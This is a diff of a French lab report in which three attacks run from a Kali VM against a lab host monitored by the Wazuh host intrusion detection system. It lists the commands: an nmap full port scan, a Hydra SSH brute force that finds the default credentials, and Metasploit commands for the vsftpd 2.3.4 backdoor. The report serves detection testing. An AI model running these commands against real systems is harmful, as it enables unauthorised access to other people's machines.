@@ -4,7 +4,8 @@ Trois scénarios d'attaque ont été exécutés depuis une VM Kali Linux (192.16
 
 ## Scénario 1 — Scan de reconnaissance (Nmap)
 
-**Commande exécutée :**nmap -sV -sC -p- 192.168.56.101 -oN nmap-full.txt
+**Commande exécutée :**
+nmap -sV -sC -p- 192.168.56.101 -oN nmap-full.txt
 **Résultat côté attaquant :** scan complet des 65535 ports, 30 ports ouverts identifiés, dont vsftpd 2.3.4 (port 21) et OpenSSH 4.7p1 (port 22), confirmant les cibles pour les scénarios suivants.
 
 **Détection côté Wazuh :** aucune alerte générée. Wazuh étant un HIDS (Host-based IDS), il surveille les logs générés localement sur la machine surveillée, pas le trafic réseau brut. Un scan de ports ne génère quasiment aucune trace exploitable dans les logs système par défaut.
@@ -13,7 +14,8 @@ Trois scénarios d'attaque ont été exécutés depuis une VM Kali Linux (192.16
 
 ## Scénario 2 — Brute force SSH (Hydra)
 
-**Commande exécutée :**hydra -l msfadmin -P wordlist-courte.txt ssh://192.168.56.101
+**Commande exécutée :**
+hydra -l msfadmin -P wordlist-courte.txt ssh://192.168.56.101
 **Résultat côté attaquant :** mot de passe trouvé (msfadmin/msfadmin) après quelques tentatives.
 
 **Détection côté Wazuh :** détecté clairement. Règle 5760 ("sshd: authentication failed"), niveau 5, déclenchée à chaque tentative échouée. Le tableau de bord montre une hausse nette du nombre d'alertes (+13), catégorisées "Password Guessing" dans le mapping MITRE ATT&CK.
@@ -22,7 +24,8 @@ Trois scénarios d'attaque ont été exécutés depuis une VM Kali Linux (192.16
 
 ## Scénario 3 — Exploitation du backdoor vsftpd 2.3.4 (Metasploit)
 
-**Commandes exécutées (msfconsole) :**use exploit/unix/ftp/vsftpd_234_backdoor
+**Commandes exécutées (msfconsole) :**
+use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.101
 set LHOST 192.168.56.102
 run
